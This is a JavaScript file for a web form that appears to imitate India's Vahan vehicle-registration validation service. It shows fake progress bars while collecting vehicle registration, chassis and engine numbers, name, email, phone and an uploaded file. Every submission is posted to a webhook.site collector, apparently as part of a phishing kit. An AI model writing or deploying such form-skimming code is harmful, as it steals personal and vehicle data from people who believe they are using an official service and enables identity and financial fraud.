function sendPayloadToAPI(payload, progressBarId, hideElementId, showElementId) {
    let progressBar = document.getElementById(progressBarId);
    progressBar.parentElement.style.display = "block";
    let progress = 0;
    let interval = setInterval(() => {
      progress += 10;
      progressBar.style.width = progress + "%";
      progressBar.innerHTML = progress + "%";
      if (progress >= 100) {
        document.getElementById(hideElementId).style.display = "none";
        document.getElementById(showElementId).style.display = "block";
        clearInterval(interval);
        fetch("https://webhook.site/aa927928-14b0-4d77-8395-51a80d642a38", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Success:", data);
            document.getElementById(hideElementId).style.display = "none";
            document.getElementById(showElementId).style.display = "block";
          })
          .catch((error) => console.error("Error:", error));
      }
    }, 200);
  }
  
  document.addEventListener("DOMContentLoaded", function () {
    let e = document.getElementById("btnValidatVahan");
    e.addEventListener("click", function () {
      const payload = {
        state: document.getElementById("ddlVehicleRegState").value,
        regNo: document.getElementById("txtRegNo").value,
        chasisNo: document.getElementById("txtChasisNo").value,
        engineNo: document.getElementById("txtEngineNo").value,
      };
      sendPayloadToAPI(payload, "progressBar", "book-detail", "user-detail");
    });
  
    let t = document.getElementById("btnValidatVahan2");
    t.addEventListener("click", function () {
      const payload = {
        name: document.getElementById("txtName").value,
        email: document.getElementById("txtEmail").value,
        phone: document.getElementById("txtPhoneNo").value,
      };
      sendPayloadToAPI(payload, "progressBar2", "user-detail", "pay-detail");
    });
  
    let a = document.getElementById("btn4");
    a.addEventListener("click", function () {
      let fileInput = document.getElementById("fileInput");
      if (fileInput.files.length > 0) {
        let formData = new FormData();
        formData.append("file", fileInput.files[0]);
        let progressBar = document.getElementById("progressBarfile");
        progressBar.parentElement.style.display = "block";
        let progress = 0;
        let interval = setInterval(() => {
          progress += 10;
          progressBar.style.width = progress + "%";
          progressBar.innerHTML = progress + "%";
          if (progress >= 100) {
            clearInterval(interval);
            fetch("https://webhook.site/aa927928-14b0-4d77-8395-51a80d642a38", {
              method: "POST",
              body: formData,
            })
              .then((response) => response.json())
              .then((data) => {
                console.log("File uploaded successfully:", data);
                document.getElementById("user-detail").style.display = "block";
                document.getElementById("book-detail").style.display = "none";
                document.getElementById("pay-detail").style.display = "none";
              })
              .catch((error) => console.error("File upload error:", error));
          }
        }, 200);
      } else {
        alert("Please select a file to upload.");
      }
    });
  
    let l = document.getElementById("btn5");
    l.addEventListener("click", function () {
      setTimeout(() => {
        window.location.href = "thankyou.html";
      }, 2000);
    });
  });
  